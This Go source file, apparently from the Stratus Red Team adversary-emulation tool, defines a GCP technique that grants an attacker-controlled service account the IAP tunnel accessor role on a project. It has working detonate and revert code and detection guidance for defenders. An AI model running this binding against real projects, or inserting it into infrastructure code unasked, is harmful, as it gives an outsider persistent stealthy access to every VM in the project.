package gcp

import (
	"context"
	_ "embed"
	"fmt"
	"log"

	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	crmv1 "google.golang.org/api/cloudresourcemanager/v1"
)

//go:embed main.tf
var tf []byte

const iapTunnelAccessorRole = "roles/iap.tunnelResourceAccessor"

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "gcp.execution.iap-tunnel-session",
		FriendlyName: "Grant IAP Tunnel Access to an External Identity",
		Description: `
Grants an attacker-controlled service account the <code>roles/iap.tunnelResourceAccessor</code>
role at the project level. This role allows the identity to open IAP TCP forwarding tunnels
to any GCE instance in the project without requiring a firewall rule exposing SSH to the
internet, giving an attacker persistent, stealthy access to all VMs in the project.

This is the GCP equivalent of AWS Systems Manager <code>StartSession</code>.

Warm-up:

- Create a GCE instance to represent an active target
- Create a service account representing the attacker-controlled identity

Detonation:

- Add a project-level IAM binding granting <code>roles/iap.tunnelResourceAccessor</code>
  to the attacker-controlled service account

Revert:

- Remove the <code>roles/iap.tunnelResourceAccessor</code> binding

References:

- https://cloud.google.com/iap/docs/using-tcp-forwarding
- https://cloud.google.com/iap/docs/reference/rest/v1/V1/setIamPolicy
`,
		Detection: `
Identify when <code>roles/iap.tunnelResourceAccessor</code> is granted on the project
by monitoring for <code>SetIamPolicy</code> events on the project resource in GCP Admin
Activity audit logs. Alert when the binding's member is unexpected or newly created,
which indicates an attacker is preparing lateral movement via IAP tunnels.
`,
		Platform:                   stratus.GCP,
		IsIdempotent:               true,
		IsSlow:                     true,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Execution, mitreattack.LateralMovement},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

func newCRMService(ctx context.Context, providers stratus.CloudProviders) (*crmv1.Service, error) {
	svc, err := crmv1.NewService(ctx, providers.GCP().Options())
	if err != nil {
		return nil, fmt.Errorf("failed to create Cloud Resource Manager client: %w", err)
	}
	return svc, nil
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	gcp := providers.GCP()
	projectId := gcp.GetProjectId()
	ctx := context.Background()

	attackerSAEmail := params["attacker_sa_email"]
	attackerMember := "serviceAccount:" + attackerSAEmail

	svc, err := newCRMService(ctx, providers)
	if err != nil {
		return err
	}

	log.Printf("Getting current IAM policy for project %s\n", projectId)
	policy, err := svc.Projects.GetIamPolicy(projectId, &crmv1.GetIamPolicyRequest{}).Context(ctx).Do()
	if err != nil {
		return fmt.Errorf("failed to get IAM policy for project %s: %w", projectId, err)
	}

	// Check whether the binding is already present to keep the operation idempotent.
	for _, b := range policy.Bindings {
		if b.Role == iapTunnelAccessorRole {
			for _, m := range b.Members {
				if m == attackerMember {
					log.Printf("Binding %s -> %s already present on project %s\n", attackerMember, iapTunnelAccessorRole, projectId)
					return nil
				}
			}
		}
	}

	policy.Bindings = append(policy.Bindings, &crmv1.Binding{
		Role:    iapTunnelAccessorRole,
		Members: []string{attackerMember},
	})

	log.Printf("Granting %s the role %s on project %s\n", attackerMember, iapTunnelAccessorRole, projectId)
	_, err = svc.Projects.SetIamPolicy(projectId, &crmv1.SetIamPolicyRequest{Policy: policy}).Context(ctx).Do()
	if err != nil {
		return fmt.Errorf("failed to set IAM policy on project %s: %w", projectId, err)
	}

	log.Printf("Successfully granted IAP tunnel access to %s — the identity can now open TCP tunnels to any instance in project %s\n",
		attackerMember, projectId)
	return nil
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
	gcp := providers.GCP()
	projectId := gcp.GetProjectId()
	ctx := context.Background()

	attackerSAEmail := params["attacker_sa_email"]
	attackerMember := "serviceAccount:" + attackerSAEmail

	svc, err := newCRMService(ctx, providers)
	if err != nil {
		return err
	}

	log.Printf("Getting current IAM policy for project %s\n", projectId)
	policy, err := svc.Projects.GetIamPolicy(projectId, &crmv1.GetIamPolicyRequest{}).Context(ctx).Do()
	if err != nil {
		return fmt.Errorf("failed to get IAM policy for project %s: %w", projectId, err)
	}

	filteredBindings := make([]*crmv1.Binding, 0, len(policy.Bindings))
	for _, b := range policy.Bindings {
		if b.Role != iapTunnelAccessorRole {
			filteredBindings = append(filteredBindings, b)
			continue
		}
		// Keep the binding but remove only the attacker member; preserve any
		// legitimate members in the same role.
		members := make([]string, 0, len(b.Members))
		for _, m := range b.Members {
			if m != attackerMember {
				members = append(members, m)
			}
		}
		if len(members) > 0 {
			b.Members = members
			filteredBindings = append(filteredBindings, b)
		}
	}

	policy.Bindings = filteredBindings
	log.Printf("Removing %s from %s on project %s\n", attackerMember, iapTunnelAccessorRole, projectId)
	_, err = svc.Projects.SetIamPolicy(projectId, &crmv1.SetIamPolicyRequest{Policy: policy}).Context(ctx).Do()
	if err != nil {
		return fmt.Errorf("failed to revert IAM policy on project %s: %w", projectId, err)
	}

	log.Printf("Successfully removed IAP tunnel access for %s\n", attackerMember)
	return nil
}
